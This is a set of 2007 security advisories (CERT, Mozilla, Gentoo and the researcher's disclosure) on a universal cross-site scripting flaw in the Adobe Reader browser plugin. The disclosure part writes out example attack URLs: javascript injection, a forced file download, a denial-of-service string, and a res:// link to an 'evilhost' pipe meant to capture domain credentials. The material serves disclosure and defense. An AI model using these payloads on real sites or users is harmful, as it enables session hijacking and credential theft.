| [Adobe Acrobat Reader](http://www.adobe.com/products/reader/) is software designed to view Portable Document Format (PDF) files. Adobe also distributes the Adobe Acrobat Plug-In to allow users to view PDF files inside of a web browser.  The Adobe Acrobat Plug-In PDF [Open Parameters](http://www.adobe.com/devnet/acrobat/pdfs/PDFOpenParameters.pdf) feature allows users to specify actions to take on a PDF document via URI parameters. However, the Adobe Acrobat Plug-In fails to properly validate these URI parameters for scripting code. This allows user-supplied scripts to execute within the context of the web site hosting the PDF file causing a cross-site scripting vulnerability. More information about cross-site scripting is available in CERT Advisory [CA-2000-02](http://www.cert.org/advisories/CA-2000-02.html).Additionally, any PDF documnt can be leveraged to exploit this vulnerability, regardless of whether that document is on the local file system or a remote web server. However, web browsers typically prevent remote content from accessing resources on the local file system. This will stop scripts originating from remote sources from accessing resources on the local file system. |
| --- |

### Impact

| An attacker may be able to obtain sensitive data from a user that visits a web site hosting a PDF document. Depending on the nature of the web site, this data may include passwords, credit card numbers, and any arbitrary information provided by the user. Likewise, information stored in cookies could be stolen or corrupted. |
| --- |

### Solution

| **Upgrade** This issue has been addressed in Adobe Reader 8. Adobe has issued updates for Adobe Reader versions prior to 8. See Adobe security bulletin [APSB07-01](http://www.adobe.com/support/security/bulletins/apsb07-01.html) for more details. Users running operating systems that do not support Adobe Reader 8 should refer to the updates listed in Adobe Security Bulletin APSB07-01. |
| --- |

| Until it is possible to upgrade to a fixed version of the Adobe Acrobat Plug-In, users can take the following steps to mitigate this vulnerability:**Disable the displaying of PDF documents in the web browser**Preventing PDF documents from opening inside a web browser may mitigate this vulnerability. If this workaround is applied to updated versions of the Adobe reader, it may mitigate future vulnerabilities.To prevent PDF documents from automatically being opened in a web browser:     1. Open Adobe Acrobat Reader. 2. Open the Edit menu. 3. Choose the preferences option. 4. Choose the Internet section. 5. Un-check the "Display PDF in browser" check box.  **Disable JavaScript**For instructions on how to disable JavaScript, please refer to the [Securing Your Web Browser](http://www.us-cert.gov/reading_room/securing_browser/) document.   **Do not access PDF documents from untrusted sources**Do not open unfamiliar or unexpected PDF documents, particularly those hosted on web sites or delivered as email attachments. Please see Cyber Security Tip [ST04-010](http://www.us-cert.gov/cas/tips/ST04-010.html).Any website that hosts a PDF document may be leveraged to exploit this vulnerability. Web site and network Administrators can take the following steps to prevent their web sites from being leveraged in attacks using this vulnerability:**Filter JavaScript in URLs**Webserver administrators may be able to prevent their websites from being leveraged in attacks by deploying a [reverse proxy](http://en.wikipedia.org/wiki/Reverse_proxy) that can filter JavaScript in URLs.**Filter JavaScript leaving the network**Network administrators may be able to prevent their clients being affected by this vulnerability by deploying a proxy server or firewall that can filter JavaScript in URLs. |

# Mozilla Foundation Security Advisory 2007-02

## Improvements to help protect against Cross-Site Scripting attacks

Announced
February 23, 2007
Reporter
various
Impact
Low
Products
Firefox, SeaMonkey
Fixed in

* Firefox 1.5.0.10
* Firefox 2.0.0.2
* SeaMonkey 1.0.8

Firefox 2.0.0.2 and 1.5.0.10 contain several small changes that will
make it easier for sites to protect their visitors against
Cross-Site Scripting (XSS) attacks.

#### Invalid trailing characters in HTML tag attributes

The Mozilla parser formerly ignored invalid trailing characters in
HTML tag attribute names. This could in some cases be abused to evade
web sites content filters that attempted to remove problematic attributes
such as event handlers. If the content filters matched attributes using
a regular expression that expected to find trailing whitespace or one of
a small set of delimiters.

The new behavior is not to consider these characters as delimiters, instead
they form part of a longer invalid attribute name, no longer allowing
expressions such as `onload..="doEvil();"` to work.

* [CVE-2007-0995](http://nvd.nist.gov/nvd.cfm?cvename=CVE-2007-0995)
* <http://ha.ckers.org/xss.html#XSS_Non_alpha_non_digit2>
* <https://bugzilla.mozilla.org/show_bug.cgi?id=314980>
* <https://bugzilla.mozilla.org/show_bug.cgi?id=315473>

#### Child frame character set inheritance

Documents on the "World Wide" Web should specify the character set being
used either in the document itself or in an HTTP header sent by the server.
In practice, however, many sites do not do this and browsers have had to
make assumptions. One of those assumptions was that if not otherwise
specified a child frame should inherit the character set of its parent
window rather than the default used for top level pages (which is generally
taken from the user's locale settings).

Stefan Esser demonstrated that this could be used for XSS attacks against
sites that accept user content and do not specify the character set
or encoding used. In this case an attack could be constructed by first
injecting script tags into the victim site encoded as UTF-7 which is unlikely
to be caught by filters since it does not contain the tell-tale angle-brackets.
Then the page with the injected content (which could be something as innocuous
as a blog comment) would be loaded in an `iframe` on the
malicious site that specifies its encoding as UTF-7. When a user views
the malicious page the injected content will run scripts in the context of
the victim site.

The new behavior is to use the same default encoding or character set we
would for top-level windows, unless the parent content comes from the same
site as the child frame.

* [CVE-2007-0996](http://nvd.nist.gov/nvd.cfm?cvename=CVE-2007-0996)
* [Hardened-PHP Project Advisory 03/2007: Multiple Browsers Cross Domain Charset Inheritance Vulnerability](http://www.hardened-php.net/advisory_032007.142.html)
* <https://bugzilla.mozilla.org/show_bug.cgi?id=356280>

#### Injected password forms

MySpace users recently suffered a phishing attack where user-created
content included a login form that appeared to be a normal MySpace
login, but was altered to submit the data to an alternate site. Because
the password form appeared on a MySpace page the Firefox password manager
filled in the saved password, lending an air of legitimacy to the
form. Note that even without the password manager many users of other
browsers were fooled into manually typing in their password, and MySpace
has since stopped allowing password fields as part of user-contributed
content.

The Firefox password manager was altered to take into account the destination
site of the password data and only replay when a form's destination matches
the one that was saved. This does not protect users if an attacker was
able to inject script into the site in addition to form controls as the
injected script could listen in on anything the user does.

* [CVE-2006-6077](http://nvd.nist.gov/nvd.cfm?cvename=CVE-2006-6077)
* <https://bugzilla.mozilla.org/show_bug.cgi?id=360493>

#### Adobe Reader universal XSS

Stefano Di Paola disclosed a "universal cross-site scripting" attack through
Adobe Reader at the 23rd Chaos Communication Congress.
This vulnerability (CVE-2007-0045) can be used against any site hosting a .pdf document
and affects users with versions of Adobe Reader 7.0.8 or below.

Users who have an older versions can protect themselves from this and other
vulnerabilities by upgrading to
[Adobe Reader 8](http://www.adobe.com/).
To help protect our users who are not aware of this need to upgrade
we have blocked requests of this type from Adobe Reader.

# Adobe Acrobat Reader: Multiple vulnerabilities — GLSA **200701-16**

Adobe Acrobat Reader is vulnerable to remote code execution, Denial of
Service, and cross-site scripting attacks.

### Affected packages

| Package | **app-text/acroread** on all architectures |
| --- | --- |
| Affected versions | < **7.0.9** |
| Unaffected versions | >= **7.0.9** |

### Background

Adobe Acrobat Reader is a PDF reader released by Adobe.

### Description

Adobe Acrobat Reader in stand-alone mode is vulnerable to remote code
execution via heap corruption when loading a specially crafted PDF
file.

The browser plugin released with Adobe Acrobat Reader (nppdf.so) does
not properly handle URLs, and crashes if given a URL that is too long.
The plugin does not correctly handle JavaScript, and executes
JavaScript that is given as a GET variable to the URL of a PDF file.
Lastly, the plugin does not properly handle the FDF, xml, xfdf AJAX
request parameters following the # character in a URL, allowing for
multiple cross-site scripting vulnerabilities.

### Impact

An attacker could entice a user to open a specially crafted PDF file
and execute arbitrary code with the rights of the user running Adobe
Acrobat Reader. An attacker could also entice a user to browse to a
specially crafted URL and either crash the Adobe Acrobat Reader browser
plugin, execute arbitrary JavaScript in the context of the user's
browser, or inject arbitrary HTML or JavaScript into the document being
viewed by the user. Note that users who have emerged Adobe Acrobat
Reader with the "nsplugin" USE flag disabled are not vulnerable to
issues with the Adobe Acrobat Reader browser plugin.

### Workaround

There is no known workaround at this time.

### Resolution

All Adobe Acrobat Reader users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=app-text/acroread-7.0.9"
```

Implementation of FDF, XML, XFDF  (http://partners.adobe.com/public/developer/en/acrobat/PDFOpenParameters.pdf)  functionalities in Acrobat Reader Plugin is vulnerable to different kind of attacks. Vulnerability extent changes from browser to browser:  1. Universal CSRF / session riding; (Mozilla Firefox, Internet Explorer, Opera + Acrobat Reader plugin)  2. UXSS in #FDF, #XML e #XFDF; (Mozilla Firefox + Acrobat Reader plugin)  3. Possible Remote Code Execution; (Mozilla Firefox + Acrobat Reader plugin)  4. Denial of Service; (Internet Explorer + Acrobat Reader plugin)  ``` Description ``` 1. Universal CSRF and session ridingThis is probably Adobe related as all tested browsers (IE,Firefox,Opera) where affected. The issue is that by creating a special link like this:  http://site.com/file.pdf#FDF=http://victim.com/index.html?param=...  automatically Adobe plugin sends a request to 'victim.com' without user interaction asking  for defined page in 'fdf' parameter. This could be used as a Universal Session Riding (aka UCSRF) attack which is a well known vulnerability.  Note that the same effect is accomplished by using 'xml' and 'xfdf' parameters.2. UXSS in #FDF, #XML e #XFDFIn addition by using the following request, is possible to execute javascript code  inside Firefox browser:  http://site.com/file.pdf#FDF=javascript:alert('Test Alert')  The previous could be triggered against a site and because of this is a Universal Cross Site  Scripting.  UXSS is a particular type of Cross Site Scripting and has the ability to be triggered  by exploiting flaws inside browsers, instead of leveraging the vulnerabilities against  insecure web sites. It's also possible to force clients to download files by supplying:  http://site.com/file.pdf#FDF=javascript:document.location= 'file://C:/winnt/notepad.exe'  <Alternative_Attack>  	Alternative Attack using NamedPipes 	- http://www.514.es/2006/10/exploiting_win32_design_flaws.html 	 	In order to steal Domain credentials with explorer : 	 	http://anyhost/file.pdf#fdf=res://\\evilhost\pipe\apipe  	and then by applying techniques found in 514.es paper we found 	this kind of url and protocol (res://) could be used too.  	This means that also Internet Explorer could be abused in conjunction of 	Adobe plugin to make attacks on internal LANs and get victims 	credentials.  </Alternative_Attack>3. Possible Remote Code ExecutionThere is also a possible Remote code Execution by leveraging a memory corruption inside  Firefox by supplying the following request:  http://site.com/file.pdf#FDF=javascript:document.write('jjjjj...');  It's possible to cause a DoubleFree() error and to overwrite part of the Structural  Exception Handler.  Runtime vulnerability analisys The problem seems to be caused by a "Double MSVCRT.free()" executed by Acrobat plugin.  The routine which cause Firefox to crash is located in the following call to NP_Shutdown().  Elia Florio is credited for Runtime analysis and exploitation.  NB. The POC of this vulnerability won't be released.4. Denial of Service (Internet Explorer only);By supplying the following request via the web browser,  it's possible to cause a denial of service in Internet Explorer:  http://site.com/file.pdf#####...(More '#')  The application is waiting for more inputs and allocates more memory.Solution[Download it](http://www.adobe.com/products/acrobat/readstep2.html)  to fix the issue.  Thanks to Adobe Psirt people, they where very kind and professional.DisclaimerIn no event shall the author be liable for any damages  whatsoever arising out of or in connection with the use  or spread of this information.
